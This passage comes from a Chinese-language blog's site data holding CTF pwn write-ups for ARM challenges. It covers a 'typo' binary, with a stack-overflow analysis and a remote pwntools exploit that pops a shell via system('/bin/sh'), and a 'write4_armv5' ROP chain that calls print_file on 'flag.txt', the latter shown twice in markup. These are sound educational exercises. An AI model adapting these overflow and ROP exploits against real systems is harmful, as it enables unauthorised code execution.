class=\"string\">&quot;\\n%s\\n&quot;</span>, &amp;aAbandon[<span class=\"number\">20</span> * idx]);      <span class=\"comment\">// 从单词表中输出一个单词</span></span><br><span class=\"line\">    correct = read_and_cmp((<span class=\"type\">int</span>)&amp;aAbandon[<span class=\"number\">20</span> * idx]);<span class=\"comment\">// 接收输入并与单词比较 漏洞在这</span></span><br><span class=\"line\">    v16 = correct;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( !correct )                             <span class=\"comment\">// 输入的与输出的不一致则输出error</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      correct = <span class=\"built_in\">puts</span>((<span class=\"type\">int</span>)<span class=\"string\">&quot;E.r.r.o.r.&quot;</span>);</span><br><span class=\"line\">      ++v19;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">while</span> ( v16 != <span class=\"number\">2</span> );</span><br><span class=\"line\">  v15 = ftime(correct);</span><br><span class=\"line\">  LODWORD(v11) = sub_9428(v15 - v18);</span><br><span class=\"line\">  v14 = v11 / <span class=\"number\">1000000.0</span>;</span><br><span class=\"line\">  write((<span class=\"type\">void</span> *)<span class=\"number\">1</span>, <span class=\"string\">&quot;------END------&quot;</span>, (<span class=\"type\">void</span> *)<span class=\"number\">0xF</span>, (<span class=\"type\">void</span> *)COERCE_UNSIGNED_INT64(v11 / <span class=\"number\">1000000.0</span>));</span><br><span class=\"line\">  sub_11F80(<span class=\"string\">&#x27;\\n&#x27;</span>);</span><br><span class=\"line\">  sub_8DF0(v20 - <span class=\"number\">1</span>, v19, v14);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>((<span class=\"type\">int</span>)<span class=\"string\">&quot;Bye&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> v12;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>重点关注接收输入并比较的函数<code>read_and_cmp</code>：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> __fastcall <span class=\"title function_\">sub_8D24</span><span class=\"params\">(<span class=\"type\">unsigned</span> __int8 *a1)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">int</span> len; <span class=\"comment\">// r0</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v2; <span class=\"comment\">// r4</span></span><br><span class=\"line\">  <span class=\"type\">char</span> v6[<span class=\"number\">112</span>]; <span class=\"comment\">// [sp+Ch] [bp-70h] BYREF</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">memset</span>(v6, <span class=\"number\">0</span>, <span class=\"number\">100</span>);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, v6, (<span class=\"type\">void</span> *)<span class=\"number\">0x200</span>, v6);               <span class=\"comment\">// 类似read，读取0x200byte到v6，存在栈溢出</span></span><br><span class=\"line\">  len = <span class=\"built_in\">strlen</span>(a1);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( !<span class=\"built_in\">strcmp</span>(a1, (<span class=\"type\">unsigned</span> __int8 *)v6, len) )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    v2 = <span class=\"built_in\">strlen</span>(a1);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( v2 == <span class=\"built_in\">strlen</span>(v6) - <span class=\"number\">1</span> )</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v6[<span class=\"number\">0</span>] == <span class=\"string\">&#x27;~&#x27;</span> )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">2</span>;                                   <span class=\"comment\">// 到这里才能跳出循环</span></span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>到这里漏洞已经挺明显的了，存在栈溢出漏洞，而且程序中存在<code>system</code>和<code>/bin/sh</code>，覆盖返回地址执行<code>system(&quot;/bin/sh&quot;)</code>就可以get shell了。</p>\n<p>但是<code>ARM</code>架构和<code>x86</code>架构有些不同，<code>ARM</code>栈结构不像<code>x86</code>那样有<code>bp</code>和<code>return_addr</code>垫在最下方，但也差不多。</p>\n<p><code>ARM</code>使用<code>LR</code>寄存器（<code>R14</code>或<code>X30</code>）保存函数的返回地址，而为了能在该函数执行完后，知道上一层函数的返回地址，需要将其保存在栈上，在函数返回时更新<code>LR</code>寄存器的值，因此可以通过栈溢出覆盖这个值来控制<code>LR</code>。</p>\n<p>在进行<code>ROP</code>的时候<code>ARM</code>也有所不同，由于<code>POP</code>和<code>PUSH</code>可以对<code>LR</code>和<code>PC</code>进行操作，没有<code>ret</code>，因此控制<code>PC</code>控制程序的执行流。通常找的<code>gadget</code>后面都有对<code>pc</code>的控制，通过控制<code>PC</code>控制执行流即可。</p>\n<p>exp:</p>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\">context(log_level=<span class=\"string\">&#x27;debug&#x27;</span>,os=<span class=\"string\">&#x27;linux&#x27;</span>,arch=<span class=\"string\">&#x27;arm&#x27;</span>)</span><br><span class=\"line\">filename=<span class=\"string\">&#x27;typo&#x27;</span></span><br><span class=\"line\">elf=ELF(<span class=\"string\">&#x27;./&#x27;</span>+filename)</span><br><span class=\"line\"><span class=\"comment\">#libc=ELF(&#x27;&#x27;)</span></span><br><span class=\"line\"><span class=\"comment\"># p=process(&#x27;./&#x27;+filename)</span></span><br><span class=\"line\"><span class=\"comment\"># p=process([&quot;qemu-arm&quot;, &quot;-g&quot;, &quot;8888&quot;, &quot;./typo&quot;])</span></span><br><span class=\"line\"><span class=\"comment\">#p=process([&#x27;./ld-2.23.so&#x27;,&#x27;./&#x27;+filename],env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc-2.23.so&#x27;&#125;)</span></span><br><span class=\"line\">p=remote(<span class=\"string\">&#x27;node4.buuoj.cn&#x27;</span>,<span class=\"number\">28805</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">s       = <span class=\"keyword\">lambda</span> data               :p.send(data)</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(data)</span><br><span class=\"line\">r       = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recv(num)</span><br><span class=\"line\">rl      = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recvline(num)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> x                  :p.recvuntil(x)</span><br><span class=\"line\">itr     = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">leak    = <span class=\"keyword\">lambda</span> name,addr          :log.success(<span class=\"string\">&#x27;&#123;&#125; = &#123;&#125;&#x27;</span>.<span class=\"built_in\">format</span>(name, addr))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">debug</span>(<span class=\"params\">cmd=<span class=\"string\">&#x27;\\n&#x27;</span></span>):</span><br><span class=\"line\">  gdb.attach(p,cmd)</span><br><span class=\"line\">  pause()</span><br><span class=\"line\">    </span><br><span class=\"line\">pop_ro_r4_pc=<span class=\"number\">0x00020904</span></span><br><span class=\"line\">sys_addr=<span class=\"number\">0x000110B4</span></span><br><span class=\"line\">binsh_addr=<span class=\"number\">0x0006C384</span></span><br><span class=\"line\">r()</span><br><span class=\"line\">s(<span class=\"string\">b&#x27;\\n&#x27;</span>)</span><br><span class=\"line\">payload=<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">112</span>+p32(pop_ro_r4_pc)+p32(binsh_addr)*<span class=\"number\">2</span>+p32(sys_addr)</span><br><span class=\"line\">s(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>"},{"title":"write_armv5","date":"2023-03-23T12:12:15.000Z","_content":"\narm pwn入门题。\n<!-- more -->\n\n查壳：32bit 动态 只有NX\n\n```sh\n[*] '/home/a1ph0nse/PwnPractice/OwnStudy/ARMpwn/write4_armv5/write4_armv5'\n    Arch:     arm-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x10000)\n    RUNPATH:  b'.'\n```\n\n逆向：\n\n这次主函数有点怪，调用的pwnme是库函数的，看不到他的具体内容，不知道栈溢出偏移。\n\n有个对`print_file`的调用和gadget:`pop {r0, pc}`还有个UsefulGadget:`STR r3, [r4] pop {r3, r4, pc}`\n\n> A PLT entry for a function named print_file() exists within the challenge binary, simply call it with the name of a file you wish to read (like \"flag.txt\") as the 1st argument.\n\n有一个叫print_file()的函数，只需要执行`print_file(\"flag.txt\")`就可以cat flag。\n\n为此我们需要将`flag.txt`写到内存中，然后控制程序执行`print_file(\"flag.txt\")`\n\n通过`UsefulGadget`可以将`flag.txt`写入到内存中。`pop {r3, r4, pc} -> STR r3, [r4] `，可以把`r3`中的内容存入`r4`指向的位置。但bss段只有2byte，写到前面data段开头，加上bss段才够`\"flag.txt\"`\n\n**需要注意的是，由于寄存器只有4byte，因此要分两次才能写完`\"flag.txt\"`。**\n\nexp:\n\n```py\nfrom pwn import*\ncontext(log_level='debug',os='linux',arch='arm')\nfilename='write4_armv5'\nelf=ELF('./'+filename)\n#libc=ELF('')\n# p=process('./'+filename)\np=process([\"qemu-arm\",\"-L\",\"/usr/arm-linux-gnueabi/\",\"-g\",\"8888\",\"./\"+filename])\n#p=process(['./ld-2.23.so','./'+filename],env={'LD_PRELOAD':'./libc-2.23.so'})\n#p=remote('',)\n\ns       = lambda data               :p.send(data)\nsl      = lambda data               :p.sendline(data)\nr       = lambda num=4096           :p.recv(num)\nrl      = lambda num=4096           :p.recvline(num)\nru      = lambda x                  :p.recvuntil(x)\nitr     = lambda                    :p.interactive()\nuu32    = lambda data               :u32(data.ljust(4,b'\\x00'))\nuu64    = lambda data               :u64(data.ljust(8,b'\\x00'))\nleak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))\n\ndef debug(cmd='\\n'):\n  gdb.attach(p,cmd)\n  pause()\n    \nstr_r3_r4=0x000105EC\npop_r3_r4_pc=0x000105F0\npop_r0_pc=0x000105F4\nprint_file_addr=elf.plt['print_file']\ndata_addr=0x00021024\n\nr()\npayload=b'a'*0x24+p32(pop_r3_r4_pc)+b\"flag\"+p32(data_addr)+p32(str_r3_r4)\npayload+=b\".txt\"+p32(data_addr+4)+p32(str_r3_r4)\npayload+=p32(pop_r0_pc)*3+p32(data_addr)+p32(print_file_addr)\ns(payload)\n\nitr()\n\n```\n\n","source":"_posts/write4.md","raw":"---\ntitle: write_armv5\ndate: 2023-03-23 20:12:15\ncategories: \n- pwn_wp\ntags: \n- pwn\n- arm\n- stackoverflow\n\n\n\n---\n\narm pwn入门题。\n<!-- more -->\n\n查壳：32bit 动态 只有NX\n\n```sh\n[*] '/home/a1ph0nse/PwnPractice/OwnStudy/ARMpwn/write4_armv5/write4_armv5'\n    Arch:     arm-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x10000)\n    RUNPATH:  b'.'\n```\n\n逆向：\n\n这次主函数有点怪，调用的pwnme是库函数的，看不到他的具体内容，不知道栈溢出偏移。\n\n有个对`print_file`的调用和gadget:`pop {r0, pc}`还有个UsefulGadget:`STR r3, [r4] pop {r3, r4, pc}`\n\n> A PLT entry for a function named print_file() exists within the challenge binary, simply call it with the name of a file you wish to read (like \"flag.txt\") as the 1st argument.\n\n有一个叫print_file()的函数，只需要执行`print_file(\"flag.txt\")`就可以cat flag。\n\n为此我们需要将`flag.txt`写到内存中，然后控制程序执行`print_file(\"flag.txt\")`\n\n通过`UsefulGadget`可以将`flag.txt`写入到内存中。`pop {r3, r4, pc} -> STR r3, [r4] `，可以把`r3`中的内容存入`r4`指向的位置。但bss段只有2byte，写到前面data段开头，加上bss段才够`\"flag.txt\"`\n\n**需要注意的是，由于寄存器只有4byte，因此要分两次才能写完`\"flag.txt\"`。**\n\nexp:\n\n```py\nfrom pwn import*\ncontext(log_level='debug',os='linux',arch='arm')\nfilename='write4_armv5'\nelf=ELF('./'+filename)\n#libc=ELF('')\n# p=process('./'+filename)\np=process([\"qemu-arm\",\"-L\",\"/usr/arm-linux-gnueabi/\",\"-g\",\"8888\",\"./\"+filename])\n#p=process(['./ld-2.23.so','./'+filename],env={'LD_PRELOAD':'./libc-2.23.so'})\n#p=remote('',)\n\ns       = lambda data               :p.send(data)\nsl      = lambda data               :p.sendline(data)\nr       = lambda num=4096           :p.recv(num)\nrl      = lambda num=4096           :p.recvline(num)\nru      = lambda x                  :p.recvuntil(x)\nitr     = lambda                    :p.interactive()\nuu32    = lambda data               :u32(data.ljust(4,b'\\x00'))\nuu64    = lambda data               :u64(data.ljust(8,b'\\x00'))\nleak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))\n\ndef debug(cmd='\\n'):\n  gdb.attach(p,cmd)\n  pause()\n    \nstr_r3_r4=0x000105EC\npop_r3_r4_pc=0x000105F0\npop_r0_pc=0x000105F4\nprint_file_addr=elf.plt['print_file']\ndata_addr=0x00021024\n\nr()\npayload=b'a'*0x24+p32(pop_r3_r4_pc)+b\"flag\"+p32(data_addr)+p32(str_r3_r4)\npayload+=b\".txt\"+p32(data_addr+4)+p32(str_r3_r4)\npayload+=p32(pop_r0_pc)*3+p32(data_addr)+p32(print_file_addr)\ns(payload)\n\nitr()\n\n```\n\n","slug":"write4","published":1,"updated":"2023-03-23T13:06:50.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clg9czagq006o5oud1j874f93","content":"<p>arm pwn入门题。</p>\n<span id=\"more\"></span>\n\n<p>查壳：32bit 动态 只有NX</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[*] <span class=\"string\">&#x27;/home/a1ph0nse/PwnPractice/OwnStudy/ARMpwn/write4_armv5/write4_armv5&#x27;</span></span><br><span class=\"line\">    Arch:     arm-32-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    No canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x10000)</span><br><span class=\"line\">    RUNPATH:  b<span class=\"string\">&#x27;.&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<p>逆向：</p>\n<p>这次主函数有点怪，调用的pwnme是库函数的，看不到他的具体内容，不知道栈溢出偏移。</p>\n<p>有个对<code>print_file</code>的调用和gadget:<code>pop &#123;r0, pc&#125;</code>还有个UsefulGadget:<code>STR r3, [r4] pop &#123;r3, r4, pc&#125;</code></p>\n<blockquote>\n<p>A PLT entry for a function named print_file() exists within the challenge binary, simply call it with the name of a file you wish to read (like “flag.txt”) as the 1st argument.</p>\n</blockquote>\n<p>有一个叫print_file()的函数，只需要执行<code>print_file(&quot;flag.txt&quot;)</code>就可以cat flag。</p>\n<p>为此我们需要将<code>flag.txt</code>写到内存中，然后控制程序执行<code>print_file(&quot;flag.txt&quot;)</code></p>\n<p>通过<code>UsefulGadget</code>可以将<code>flag.txt</code>写入到内存中。<code>pop &#123;r3, r4, pc&#125; -&gt; STR r3, [r4] </code>，可以把<code>r3</code>中的内容存入<code>r4</code>指向的位置。但bss段只有2byte，写到前面data段开头，加上bss段才够<code>&quot;flag.txt&quot;</code></p>\n<p><strong>需要注意的是，由于寄存器只有4byte，因此要分两次才能写完<code>&quot;flag.txt&quot;</code>。</strong></p>\n<p>exp:</p>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\">context(log_level=<span class=\"string\">&#x27;debug&#x27;</span>,os=<span class=\"string\">&#x27;linux&#x27;</span>,arch=<span class=\"string\">&#x27;arm&#x27;</span>)</span><br><span class=\"line\">filename=<span class=\"string\">&#x27;write4_armv5&#x27;</span></span><br><span class=\"line\">elf=ELF(<span class=\"string\">&#x27;./&#x27;</span>+filename)</span><br><span class=\"line\"><span class=\"comment\">#libc=ELF(&#x27;&#x27;)</span></span><br><span class=\"line\"><span class=\"comment\"># p=process(&#x27;./&#x27;+filename)</span></span><br><span class=\"line\">p=process([<span class=\"string\">&quot;qemu-arm&quot;</span>,<span class=\"string\">&quot;-L&quot;</span>,<span class=\"string\">&quot;/usr/arm-linux-gnueabi/&quot;</span>,<span class=\"string\">&quot;-g&quot;</span>,<span class=\"string\">&quot;8888&quot;</span>,<span class=\"string\">&quot;./&quot;</span>+filename])</span><br><span class=\"line\"><span class=\"comment\">#p=process([&#x27;./ld-2.23.so&#x27;,&#x27;./&#x27;+filename],env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc-2.23.so&#x27;&#125;)</span></span><br><span class=\"line\"><span class=\"comment\">#p=remote(&#x27;&#x27;,)</span></span><br><span class=\"line\"></span><br><span class=\"line\">s       = <span class=\"keyword\">lambda</span> data               :p.send(data)</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(data)</span><br><span class=\"line\">r       = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recv(num)</span><br><span class=\"line\">rl      = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recvline(num)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> x                  :p.recvuntil(x)</span><br><span class=\"line\">itr     = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">leak    = <span class=\"keyword\">lambda</span> name,addr          :log.success(<span class=\"string\">&#x27;&#123;&#125; = &#123;&#125;&#x27;</span>.<span class=\"built_in\">format</span>(name, addr))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">debug</span>(<span class=\"params\">cmd=<span class=\"string\">&#x27;\\n&#x27;</span></span>):</span><br><span class=\"line\">  gdb.attach(p,cmd)</span><br><span class=\"line\">  pause()</span><br><span class=\"line\">    </span><br><span class=\"line\">str_r3_r4=<span class=\"number\">0x000105EC</span></span><br><span class=\"line\">pop_r3_r4_pc=<span class=\"number\">0x000105F0</span></span><br><span class=\"line\">pop_r0_pc=<span class=\"number\">0x000105F4</span></span><br><span class=\"line\">print_file_addr=elf.plt[<span class=\"string\">&#x27;print_file&#x27;</span>]</span><br><span class=\"line\">data_addr=<span class=\"number\">0x00021024</span></span><br><span class=\"line\"></span><br><span class=\"line\">r()</span><br><span class=\"line\">payload=<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x24</span>+p32(pop_r3_r4_pc)+<span class=\"string\">b&quot;flag&quot;</span>+p32(data_addr)+p32(str_r3_r4)</span><br><span class=\"line\">payload+=<span class=\"string\">b&quot;.txt&quot;</span>+p32(data_addr+<span class=\"number\">4</span>)+p32(str_r3_r4)</span><br><span class=\"line\">payload+=p32(pop_r0_pc)*<span class=\"number\">3</span>+p32(data_addr)+p32(print_file_addr)</span><br><span class=\"line\">s(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">itr()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n","site":{"data":{}},"excerpt":"<p>arm pwn入门题。</p>","more":"<p>查壳：32bit 动态 只有NX</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[*] <span class=\"string\">&#x27;/home/a1ph0nse/PwnPractice/OwnStudy/ARMpwn/write4_armv5/write4_armv5&#x27;</span></span><br><span class=\"line\">    Arch:     arm-32-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    No canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x10000)</span><br><span class=\"line\">    RUNPATH:  b<span class=\"string\">&#x27;.&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<p>逆向：</p>\n<p>这次主函数有点怪，调用的pwnme是库函数的，看不到他的具体内容，不知道栈溢出偏移。</p>\n<p>有个对<code>print_file</code>的调用和gadget:<code>pop &#123;r0, pc&#125;</code>还有个UsefulGadget:<code>STR r3, [r4] pop &#123;r3, r4, pc&#125;</code></p>\n<blockquote>\n<p>A PLT entry for a function named print_file() exists within the challenge binary, simply call it with the name of a file you wish to read (like “flag.txt”) as the 1st argument.</p>\n</blockquote>\n<p>有一个叫print_file()的函数，只需要执行<code>print_file(&quot;flag.txt&quot;)</code>就可以cat flag。</p>\n<p>为此我们需要将<code>flag.txt</code>写到内存中，然后控制程序执行<code>print_file(&quot;flag.txt&quot;)</code></p>\n<p>通过<code>UsefulGadget</code>可以将<code>flag.txt</code>写入到内存中。<code>pop &#123;r3, r4, pc&#125; -&gt; STR r3, [r4] </code>，可以把<code>r3</code>中的内容存入<code>r4</code>指向的位置。但bss段只有2byte，写到前面data段开头，加上bss段才够<code>&quot;flag.txt&quot;</code></p>\n<p><strong>需要注意的是，由于寄存器只有4byte，因此要分两次才能写完<code>&quot;flag.txt&quot;</code>。</strong></p>\n<p>exp:</p>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\">context(log_level=<span class=\"string\">&#x27;debug&#x27;</span>,os=<span class=\"string\">&#x27;linux&#x27;</span>,arch=<span class=\"string\">&#x27;arm&#x27;</span>)</span><br><span class=\"line\">filename=<span class=\"string\">&#x27;write4_armv5&#x27;</span></span><br><span class=\"line\">elf=ELF(<span class=\"string\">&#x27;./&#x27;</span>+filename)</span><br><span class=\"line\"><span class=\"comment\">#libc=ELF(&#x27;&#x27;)</span></span><br><span class=\"line\"><span class=\"comment\"># p=process(&#x27;./&#x27;+filename)</span></span><br><span class=\"line\">p=process([<span class=\"string\">&quot;qemu-arm&quot;</span>,<span class=\"string\">&quot;-L&quot;</span>,<span class=\"string\">&quot;/usr/arm-linux-gnueabi/&quot;</span>,<span class=\"string\">&quot;-g&quot;</span>,<span class=\"string\">&quot;8888&quot;</span>,<span class=\"string\">&quot;./&quot;</span>+filename])</span><br><span class=\"line\"><span class=\"comment\">#p=process([&#x27;./ld-2.23.so&#x27;,&#x27;./&#x27;+filename],env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc-2.23.so&#x27;&#125;)</span></span><br><span class=\"line\"><span class=\"comment\">#p=remote(&#x27;&#x27;,)</span></span><br><span class=\"line\"></span><br><span class=\"line\">s       = <span class=\"keyword\">lambda</span> data               :p.send(data)</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(data)</span><br><span class=\"line\">r       = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recv(num)</span><br><span class=\"line\">rl      = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recvline(num)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> x                  :p.recvuntil(x)</span><br><span class=\"line\">itr     = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">leak    = <span class=\"keyword\">lambda</span> name,addr          :log.success(<span class=\"string\">&#x27;&#123;&#125; = &#123;&#125;&#x27;</span>.<span class=\"built_in\">format</span>(name, addr))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">debug</span>(<span class=\"params\">cmd=<span class=\"string\">&#x27;\\n&#x27;</span></span>):</span><br><span class=\"line\">  gdb.attach(p,cmd)</span><br><span class=\"line\">  pause()</span><br><span class=\"line\">    </span><br><span class=\"line\">str_r3_r4=<span class=\"number\">0x000105EC</span></span><br><span class=\"line\">pop_r3_r4_pc=<span class=\"number\">0x000105F0</span></span><br><span class=\"line\">pop_r0_pc=<span class=\"number\">0x000105F4</span></span><br><span class=\"line\">print_file_addr=elf.plt[<span class=\"string\">&#x27;print_file&#x27;</span>]</span><br><span class=\"line\">data_addr=<span class=\"number\">0x00021024</span></span><br><span class=\"line\"></span><br><span class=\"line\">r()</span><br><span class=\"line\">payload=<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x24</span>+p32(pop_r3_r4_pc)+<span class=\"string\">b&quot;flag&quot;</span>+p32(data_addr)+p32(str_r3_r4)</span><br><span class=\"line\">payload+=<span 